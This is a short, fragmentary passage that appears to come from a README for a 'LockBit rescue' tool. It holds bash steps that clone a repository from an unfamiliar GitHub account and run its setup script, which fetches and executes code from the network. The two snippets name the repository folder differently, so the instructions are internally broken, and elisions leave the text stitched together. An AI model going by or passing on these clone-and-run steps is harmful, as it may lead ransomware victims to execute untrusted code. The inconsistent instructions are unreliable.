...
```bash
git clone https://github.com/EarthRepair11/lockbit-rescue-589.git
cd lockbit-rescue-589
python setup.py
```
...
```bash
# 1. Get the tool
git clone https://github.com/EarthRepair11/lockbit-rescue-589
cd lockbit-rescue
...
<!-- Last updated: 2026-06-06 17:20:54 -->
